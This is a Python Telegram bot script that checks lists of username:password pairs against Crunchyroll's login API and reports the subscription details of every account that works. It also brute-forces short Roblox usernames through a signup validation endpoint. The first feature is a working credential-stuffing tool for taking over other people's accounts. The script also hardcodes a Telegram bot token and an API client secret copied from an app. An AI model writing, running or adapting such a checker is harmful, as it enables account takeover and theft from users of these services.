import telebot
import requests
import urllib.parse
import uuid
import os
import itertools
import string
import time
import random
from datetime import datetime
bot = telebot.TeleBot("7095538437:AAFNebiEtU_3JkgVZX1Ggfjo2hKlA4izjCA")
def FIAI(value):
    return urllib.parse.quote(value)
def FIJ():
    return str(uuid.uuid4())
def get_token(username, password):
    p = FIAI(password)
    ded = FIJ()
    sed = FIJ()
    u = FIAI(username)
    H3 = {
        "ETP-Anonymous-ID": ded,
        "Request-Type": "SignIn",
        "Accept": "application/json",
        "Accept-Charset": "UTF-8",
        "User-Agent": "Ktor client",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "beta-api.crunchyroll.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    FiT = f"grant_type=password&username={u}&password={p}&scope=offline_access&client_id=yhukoj8on9w2pcpgjkn_&client_secret=q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF&device_type=FIRETV&device_id={sed}&device_name=kara"
    Fix = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", headers=H3, data=FiT)
    if "invalid_credentials" in Fix.text:
        return None, "Invalid credentials"
    elif "\"access_token\":\"" in Fix.text:
        access_token = Fix.json().get("access_token")
        return access_token, None
    else:
        return None, "Unexpected response"
def get_user_info(access_token):
    H3 = {
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/json",
        "Accept-Charset": "UTF-8",
        "User-Agent": "Ktor client",#User-Agent": "Crunchyroll/4.48.1 (bundle_identifier:com.crunchyroll.iphone; build_number:3578348.327156123) iOS/17.4.1 Gravity/4.48.1", تكدر تحط هذا نوع {@Q_b_h}
        "Content-Length": "0",
        "Host": "beta-api.crunchyroll.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    Fix = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=H3)
    if "accounts.get_account_info.forbidden" in Fix.text:
        return None, "Token expired or forbidden"
    elif "external_id" in Fix.text:
        external_id = Fix.json().get("external_id")
        return external_id, None
    else:
        return None, "Unexpected response"
def get_FIY(access_token, external_id):
    H3 = {
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/json",
        "Accept-Charset": "UTF-8",
        "User-Agent": "Ktor client",
        "Content-Length": "0",
        "Host": "beta-api.crunchyroll.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    Fix = requests.get(f"https://beta-api.crunchyroll.com//subs/v1/subscriptions/{external_id}/third_party_products", headers=H3)
    if any(key in Fix.text for key in ["fan", "premium", "no_ads", "is_subscribable\":false"]):
        data = Fix.json()
        FIY = {
            "Plan": data.get("description"),
            "Plan Type": data.get("type"),
            "Is Free Trial": data.get("active_free_trial"),
            "Payment Mode": data.get("source"),
            "Auto Renew": data.get("auto_renew"),
            "Expiry": data.get("expiration_date").split("T")[0]
        }
        return FIY, None
    elif any(key in Fix.text for key in ["subscription.not_found", "Subscription Not Found", ",\"total\":0,\"items\":[]}", "is_subscribable\":true"]):
        return None, "Subscription not found or custom condition met"
    else:
        return None, "Unexpected response"
def FIV(file_path):
    with open(file_path, 'r') as file:
        return [line.strip().split(':') for line in file]
def rFoR():
    return datetime(random.randint(1884, 2024), random.randint(1, 12), random.randint(1, 28)).isoformat() + 'Z'
def uFoU(username):
    url = "https://auth.roblox.com/v1/usernames/validate"
    headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    params = {"birthday": rFoR(), "context": "Signup", "username": username}
    response = requests.get(url, headers=headers, params=params)    
    if response.status_code != 200:
        return f"{username}: Failed to connect to the server"
    data = response.json()
    messages = {
        "Username is already in use": "Username is already in use",
        "Username not appropriate for Roblox": "Username not appropriate for Roblox",
        "Username is valid": "Username is valid",
        "Usernames can have at most one _": "Usernames can have at most one _",
        "Only a-z, A-Z, 0-9, and _ are allowed": "Only a-z, A-Z, 0-9, and _ are allowed",
        "Usernames can be 3 to 20 characters long": "Usernames can be 3 to 20 characters long"
    }
    return f"{username}: {next((msg for key, msg in messages.items() if key in data.values()), 'Unknown error')}"
def gFoG(length=3):
    return (''.join(comb) for comb in itertools.product(string.ascii_letters + string.digits, repeat=length))
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.InlineKeyboardMarkup()
    btn1 = telebot.types.InlineKeyboardButton("check accounts crunchyroll", callback_data="check_accounts")
    btn2 = telebot.types.InlineKeyboardButton("check usage RobloX", callback_data="check_usernames")
    markup.add(btn1, btn2)
    bot.send_message(message.chat.id, "Select desired option:", reply_markup=markup)
@bot.callback_query_handler(func=lambda call: call.data == "check_accounts")
def check_accounts(call):
    bot.send_message(call.message.chat.id, "send file:")    
@bot.message_handler(content_types=['document'])
def handle_file(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        FiD = bot.download_file(file_info.file_path)
        file_path = os.path.join(message.document.file_name)
        with open(file_path, 'wb') as file:
            file.write(FiD)
        accounts = FIV(file_path)
        os.remove(file_path)
        for username, password in accounts:
            try:
                access_token, error = get_token(username, password)
                if error:
                    bot.send_message(message.chat.id, f"Failed to get token for {username}: {error}")
                    continue
                external_id, error = get_user_info(access_token)
                if error:
                    bot.send_message(message.chat.id, f"Failed to get user info for {username}: {error}")
                    continue
                FIY, error = get_FIY(access_token, external_id)
                if error:
                    bot.send_message(message.chat.id, f"Failed to get subscription info for {username}: {error}")
                    continue
                FIN = f"Account: {username}\nSubscription Info: {FIY}"
                markup = telebot.types.InlineKeyboardMarkup()
                btn = telebot.types.InlineKeyboardButton("Show Details", callback_data=username)
                markup.add(btn)
                bot.send_message(message.chat.id, FIN, reply_markup=markup)
            except Exception as e:
                bot.send_message(message.chat.id, f"Error processing {username}: {e}")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")
@bot.callback_query_handler(func=lambda call: call.data == "check_usernames")
def check_usernames(call):
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("Three-Letter Usernames", callback_data='3'))
    markup.add(telebot.types.InlineKeyboardButton("Four-Letter Usernames", callback_data='4'))
    bot.send_message(call.message.chat.id, "Choose the type of usernames to check:", reply_markup=markup)
@bot.callback_query_handler(func=lambda call: call.data in ['3', '4'])
def start_checking_usernames(call):
    length = int(call.data)
    bot.send_message(call.message.chat.id, f"Checking {length}-letter usernames. Please wait...")
    for username in gFoG(length):
        result = uFoU(username)
        if "Username is valid" in result:
            bot.send_message(call.message.chat.id, result)
        time.sleep(1)
bot.polling()
